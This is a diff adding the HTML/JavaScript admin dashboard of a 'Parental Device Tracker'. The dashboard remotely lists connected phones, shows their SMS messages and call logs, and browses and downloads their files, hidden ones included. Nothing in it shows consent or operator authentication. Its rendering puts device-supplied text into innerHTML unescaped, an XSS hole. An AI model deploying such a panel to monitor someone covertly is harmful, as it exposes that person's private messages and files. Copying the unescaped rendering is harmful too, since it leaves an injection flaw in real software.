@@ -1,0 +1,814 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Parental Device Tracker - Admin Dashboard</title>
+    <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .header {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            color: #333;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            color: #666;
+            font-size: 1.1em;
+        }
+
+        .devices-table {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        thead {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        th {
+            padding: 20px;
+            text-align: left;
+            font-weight: 600;
+            font-size: 1.1em;
+        }
+
+        td {
+            padding: 20px;
+            border-bottom: 1px solid #eee;
+        }
+
+        tbody tr:hover {
+            background: #f5f5f5;
+        }
+
+        tbody tr:last-child td {
+            border-bottom: none;
+        }
+
+        .status-dot {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .status-active {
+            background: #4caf50;
+            box-shadow: 0 0 8px #4caf50;
+        }
+
+        .status-inactive {
+            background: #f44336;
+        }
+
+        .battery-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .battery-level {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .battery-charging {
+            color: #4caf50;
+            font-size: 1.2em;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.95em;
+            font-weight: 600;
+            transition: all 0.3s;
+            color: white;
+        }
+
+        .btn-sms {
+            background: #2196F3;
+        }
+
+        .btn-sms:hover {
+            background: #1976D2;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(33, 150, 243, 0.4);
+        }
+
+        .btn-call {
+            background: #FF9800;
+        }
+
+        .btn-call:hover {
+            background: #F57C00;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(255, 152, 0, 0.4);
+        }
+
+        .btn-files {
+            background: #9C27B0;
+        }
+
+        .btn-files:hover {
+            background: #7B1FA2;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(156, 39, 176, 0.4);
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.7);
+            animation: fadeIn 0.3s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-content {
+            background: white;
+            margin: 50px auto;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 900px;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: slideIn 0.3s;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateY(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #eee;
+        }
+
+        .modal-header h2 {
+            color: #333;
+            font-size: 1.8em;
+        }
+
+        .close {
+            color: #aaa;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        .close:hover {
+            color: #333;
+        }
+
+        .log-item {
+            padding: 15px;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            background: #f9f9f9;
+            border-left: 4px solid #667eea;
+        }
+
+        .log-item-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .log-number {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .log-type {
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.85em;
+            font-weight: 600;
+        }
+
+        .type-incoming {
+            background: #E3F2FD;
+            color: #1976D2;
+        }
+
+        .type-outgoing {
+            background: #FFF3E0;
+            color: #F57C00;
+        }
+
+        .type-missed {
+            background: #FFEBEE;
+            color: #C62828;
+        }
+
+        .log-body {
+            color: #666;
+            margin-top: 5px;
+            word-wrap: break-word;
+        }
+
+        .log-date {
+            color: #999;
+            font-size: 0.9em;
+            margin-top: 5px;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #999;
+        }
+
+        .empty-state-icon {
+            font-size: 4em;
+            margin-bottom: 20px;
+        }
+
+        /* File Manager Styles */
+        .file-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+        }
+
+        .file-item {
+            padding: 15px;
+            border-radius: 8px;
+            background: #f9f9f9;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 2px solid transparent;
+        }
+
+        .file-item:hover {
+            background: #e3f2fd;
+            border-color: #2196F3;
+            transform: translateY(-2px);
+        }
+
+        .file-item.directory {
+            background: #fff3e0;
+        }
+
+        .file-item.directory:hover {
+            background: #ffe0b2;
+            border-color: #FF9800;
+        }
+
+        .file-icon {
+            font-size: 2em;
+            margin-bottom: 10px;
+        }
+
+        .file-name {
+            font-weight: 600;
+            color: #333;
+            word-wrap: break-word;
+        }
+
+        .file-size {
+            font-size: 0.85em;
+            color: #999;
+            margin-top: 5px;
+        }
+
+        .file-path {
+            margin-bottom: 20px;
+            padding: 10px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            font-family: monospace;
+            color: #666;
+        }
+
+        .back-btn {
+            background: #757575;
+            margin-bottom: 15px;
+        }
+
+        .back-btn:hover {
+            background: #616161;
+        }
+
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 1.8em;
+            }
+
+            table {
+                font-size: 0.9em;
+            }
+
+            th, td {
+                padding: 12px 8px;
+            }
+
+            .action-buttons {
+                flex-direction: column;
+            }
+
+            .btn {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📱 Parental Device Tracker</h1>
+            <p>Real-time Monitoring Dashboard</p>
+        </div>
+
+        <div class="devices-table">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Device Name</th>
+                        <th>Model</th>
+                        <th>Battery</th>
+                        <th>Status</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="devicesTableBody">
+                    <tr>
+                        <td colspan="5" class="empty-state">
+                            <div class="empty-state-icon">📡</div>
+                            <p>No devices connected yet. Waiting for connections...</p>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- SMS Modal -->
+    <div id="smsModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>📨 SMS History</h2>
+                <span class="close" onclick="closeModal('smsModal')">&times;</span>
+            </div>
+            <div id="smsContent"></div>
+        </div>
+    </div>
+
+    <!-- Calls Modal -->
+    <div id="callsModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>📞 Call History</h2>
+                <span class="close" onclick="closeModal('callsModal')">&times;</span>
+            </div>
+            <div id="callsContent"></div>
+        </div>
+    </div>
+
+    <!-- Files Modal -->
+    <div id="filesModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>📁 File Manager</h2>
+                <span class="close" onclick="closeModal('filesModal')">&times;</span>
+            </div>
+            <div id="filesContent"></div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        
+        let devices = [];
+        let smsLogs = {}; // deviceId -> array
+        let callLogs = {}; // deviceId -> array
+        let currentDeviceId = null;
+        let currentFilePath = '/';
+
+        // Listen for device list updates
+        socket.on('deviceList', (deviceList) => {
+            devices = deviceList;
+            updateDevicesTable();
+        });
+
+        // Listen for new SMS
+        socket.on('newSMS', (data) => {
+            if (!smsLogs[data.deviceId]) {
+                smsLogs[data.deviceId] = [];
+            }
+            smsLogs[data.deviceId].push(data);
+            
+            // Update modal if open for this device
+            if (currentDeviceId === data.deviceId && document.getElementById('smsModal').style.display === 'block') {
+                showSMS(data.deviceId);
+            }
+        });
+
+        // Listen for new calls
+        socket.on('newCall', (data) => {
+            if (!callLogs[data.deviceId]) {
+                callLogs[data.deviceId] = [];
+            }
+            callLogs[data.deviceId].push(data);
+            
+            // Update modal if open for this device
+            if (currentDeviceId === data.deviceId && document.getElementById('callsModal').style.display === 'block') {
+                showCalls(data.deviceId);
+            }
+        });
+
+        // Listen for file list
+        socket.on('fileList', (data) => {
+            if (data.deviceId === currentDeviceId) {
+                showFileList(data);
+            }
+        });
+
+        // Listen for file chunks
+        socket.on('fileChunk', (data) => {
+            if (data.deviceId === currentDeviceId) {
+                handleFileChunk(data);
+            }
+        });
+
+        function updateDevicesTable() {
+            const tbody = document.getElementById('devicesTableBody');
+            
+            if (devices.length === 0) {
+                tbody.innerHTML = `
+                    <tr>
+                        <td colspan="5" class="empty-state">
+                            <div class="empty-state-icon">📡</div>
+                            <p>No devices connected yet. Waiting for connections...</p>
+                        </td>
+                    </tr>
+                `;
+                return;
+            }
+
+            tbody.innerHTML = devices.map(device => `
+                <tr>
+                    <td>${device.deviceName}</td>
+                    <td>${device.deviceModel}</td>
+                    <td>
+                        <div class="battery-container">
+                            <span class="battery-level">${device.battery}%</span>
+                            ${device.charging ? '<span class="battery-charging">⚡</span>' : ''}
+                        </div>
+                    </td>
+                    <td>
+                        <span class="status-dot ${device.active ? 'status-active' : 'status-inactive'}"></span>
+                        ${device.active ? 'Active' : 'Inactive'}
+                    </td>
+                    <td>
+                        <div class="action-buttons">
+                            <button class="btn btn-sms" onclick="showSMS('${device.deviceId}')">View SMS</button>
+                            <button class="btn btn-call" onclick="showCalls('${device.deviceId}')">View Calls</button>
+                            <button class="btn btn-files" onclick="showFiles('${device.deviceId}')">View Files</button>
+                        </div>
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        function showSMS(deviceId) {
+            currentDeviceId = deviceId;
+            const modal = document.getElementById('smsModal');
+            const content = document.getElementById('smsContent');
+            
+            // Fetch SMS logs
+            fetch(`/api/sms/${deviceId}`)
+                .then(res => res.json())
+                .then(smsList => {
+                    if (!smsList || smsList.length === 0) {
+                        content.innerHTML = `
+                            <div class="empty-state">
+                                <div class="empty-state-icon">📭</div>
+                                <p>No SMS logs found for this device</p>
+                            </div>
+                        `;
+                    } else {
+                        content.innerHTML = smsList.reverse().map(sms => {
+                            const date = new Date(sms.date).toLocaleString();
+                            return `
+                                <div class="log-item">
+                                    <div class="log-item-header">
+                                        <span class="log-number">${sms.number || 'Unknown'}</span>
+                                        <span class="log-type type-${sms.type}">${sms.type}</span>
+                                    </div>
+                                    <div class="log-body">${sms.body || '(Empty)'}</div>
+                                    <div class="log-date">${date}</div>
+                                </div>
+                            `;
+                        }).join('');
+                    }
+                })
+                .catch(err => {
+                    content.innerHTML = `<div class="empty-state"><p>Error loading SMS: ${err.message}</p></div>`;
+                });
+            
+            modal.style.display = 'block';
+        }
+
+        function showCalls(deviceId) {
+            currentDeviceId = deviceId;
+            const modal = document.getElementById('callsModal');
+            const content = document.getElementById('callsContent');
+            
+            // Fetch call logs
+            fetch(`/api/calls/${deviceId}`)
+                .then(res => res.json())
+                .then(callList => {
+                    if (!callList || callList.length === 0) {
+                        content.innerHTML = `
+                            <div class="empty-state">
+                                <div class="empty-state-icon">📵</div>
+                                <p>No call logs found for this device</p>
+                            </div>
+                        `;
+                    } else {
+                        content.innerHTML = callList.reverse().map(call => {
+                            const date = new Date(call.date).toLocaleString();
+                            const duration = formatDuration(call.duration || 0);
+                            return `
+                                <div class="log-item">
+                                    <div class="log-item-header">
+                                        <span class="log-number">${call.number || 'Unknown'}</span>
+                                        <span class="log-type type-${call.type}">${call.type}</span>
+                                    </div>
+                                    <div class="log-body">Duration: ${duration}</div>
+                                    <div class="log-date">${date}</div>
+                                </div>
+                            `;
+                        }).join('');
+                    }
+                })
+                .catch(err => {
+                    content.innerHTML = `<div class="empty-state"><p>Error loading calls: ${err.message}</p></div>`;
+                });
+            
+            modal.style.display = 'block';
+        }
+
+        function showFiles(deviceId) {
+            currentDeviceId = deviceId;
+            currentFilePath = '/';
+            const modal = document.getElementById('filesModal');
+            const content = document.getElementById('filesContent');
+            
+            content.innerHTML = `
+                <div class="empty-state">
+                    <div class="empty-state-icon">⏳</div>
+                    <p>Loading files...</p>
+                </div>
+            `;
+            
+            // Request file list from device
+            socket.emit('requestFileList', { deviceId, path: '/' });
+            modal.style.display = 'block';
+        }
+
+        function showFileList(data) {
+            const content = document.getElementById('filesContent');
+            
+            if (!data.files || data.files.length === 0) {
+                content.innerHTML = `
+                    <div class="file-path">Path: ${data.path || '/'}</div>
+                    <button class="btn back-btn" onclick="navigateUp()">← Back</button>
+                    <div class="empty-state">
+                        <div class="empty-state-icon">📁</div>
+                        <p>This folder is empty</p>
+                    </div>
+                `;
+                return;
+            }
+
+            const filesHtml = data.files.map(file => `
+                <div class="file-item ${file.isDirectory ? 'directory' : ''} ${file.isHidden ? 'hidden-file' : ''}" 
+                     onclick="${file.isDirectory ? `navigateTo('${file.path}')` : `downloadFile('${file.path}', '${file.name}')`}">
+                    <div class="file-icon">${file.isDirectory ? '📁' : '📄'}</div>
+                    <div class="file-name">${file.name}${file.isHidden ? ' (Hidden)' : ''}</div>
+                    ${!file.isDirectory ? `<div class="file-size">${formatFileSize(file.size)}</div>` : ''}
+                </div>
+            `).join('');
+
+            content.innerHTML = `
+                <div class="file-path">Path: ${data.path || '/'}</div>
+                ${data.path !== '/' ? '<button class="btn back-btn" onclick="navigateUp()">← Back</button>' : ''}
+                <div class="file-list">${filesHtml}</div>
+            `;
+            
+            currentFilePath = data.path || '/';
+        }
+
+        function navigateTo(path) {
+            currentFilePath = path;
+            socket.emit('requestFileList', { deviceId: currentDeviceId, path: path });
+        }
+
+        function navigateUp() {
+            const parentPath = currentFilePath.split('/').slice(0, -1).join('/') || '/';
+            navigateTo(parentPath);
+        }
+
+        let downloadBuffer = new Uint8Array(0);
+        let downloadFileName = '';
+        let downloadTotalSize = 0;
+        let downloadCurrentOffset = 0;
+
+        function downloadFile(filePath, fileName) {
+            if (!confirm(`Download file: ${fileName}?`)) {
+                return;
+            }
+
+            downloadBuffer = new Uint8Array(0);
+            downloadFileName = fileName || 'download';
+            downloadTotalSize = 0;
+            downloadCurrentOffset = 0;
+
+            // Show download progress
+            const progressDiv = document.createElement('div');
+            progressDiv.id = 'downloadProgress';
+            progressDiv.style.cssText = 'position: fixed; top: 20px; right: 20px; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.3); z-index: 10000; min-width: 300px;';
+            progressDiv.innerHTML = `
+                <div style="margin-bottom: 10px; font-weight: 600;">Downloading: ${fileName}</div>
+                <div style="background: #f0f0f0; border-radius: 5px; height: 20px; overflow: hidden;">
+                    <div id="downloadProgressBar" style="background: #4caf50; height: 100%; width: 0%; transition: width 0.3s;"></div>
+                </div>
+                <div id="downloadProgressText" style="margin-top: 10px; font-size: 0.9em; color: #666;">Starting...</div>
+            `;
+            document.body.appendChild(progressDiv);
+
+            // Request file download
+            socket.emit('requestFileDownload', { deviceId: currentDeviceId, filePath: filePath });
+        }
+
+        function handleFileChunk(data) {
+            if (data.error) {
+                document.getElementById('downloadProgressText').textContent = 'Error: ' + data.error;
+                setTimeout(() => {
+                    const progressDiv = document.getElementById('downloadProgress');
+                    if (progressDiv) progressDiv.remove();
+                }, 3000);
+                return;
+            }
+
+            if (data.complete && data.offset === 0 && !data.data) {
+                // Download complete signal
+                downloadTotalSize = data.totalSize || downloadTotalSize;
+                return;
+            }
+
+            if (data.totalSize) {
+                downloadTotalSize = data.totalSize;
+            }
+
+            if (data.data) {
+                // Decode base64 chunk
+                const binaryString = atob(data.data);
+                const chunkBytes = new Uint8Array(binaryString.length);
+                for (let i = 0; i < binaryString.length; i++) {
+                    chunkBytes[i] = binaryString.charCodeAt(i);
+                }
+
+                // Append to buffer
+                const newBuffer = new Uint8Array(downloadBuffer.length + chunkBytes.length);
+                newBuffer.set(downloadBuffer);
+                newBuffer.set(chunkBytes, downloadBuffer.length);
+                downloadBuffer = newBuffer;
+                downloadCurrentOffset = data.offset + data.chunkSize;
+
+                // Update progress
+                const progress = downloadTotalSize > 0 ? (downloadCurrentOffset / downloadTotalSize) * 100 : 0;
+                document.getElementById('downloadProgressBar').style.width = progress + '%';
+                document.getElementById('downloadProgressText').textContent = 
+                    `${formatFileSize(downloadCurrentOffset)} / ${formatFileSize(downloadTotalSize)} (${Math.round(progress)}%)`;
+
+                if (data.complete) {
+                    // Download complete - trigger download
+                    const blob = new Blob([downloadBuffer]);
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = downloadFileName;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+
+                    document.getElementById('downloadProgressText').textContent = 'Download complete!';
+                    setTimeout(() => {
+                        const progressDiv = document.getElementById('downloadProgress');
+                        if (progressDiv) progressDiv.remove();
+                    }, 2000);
+                } else {
+                    // Request next chunk
+                    socket.emit('requestFileChunk', { 
+                        deviceId: currentDeviceId, 
+                        filePath: data.filePath, 
+                        offset: downloadCurrentOffset 
+                    });
+                }
+            }
+        }
+
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
+        }
+
+        function formatDuration(seconds) {
+            if (seconds === 0) return '0s';
+            const mins = Math.floor(seconds / 60);
+            const secs = seconds % 60;
+            return mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modals = ['smsModal', 'callsModal', 'filesModal'];
+            modals.forEach(modalId => {
+                const modal = document.getElementById(modalId);
+                if (event.target === modal) {
+                    modal.style.display = 'none';
+                }
+            });
+        }
+    </script>
+</body>
+</html>
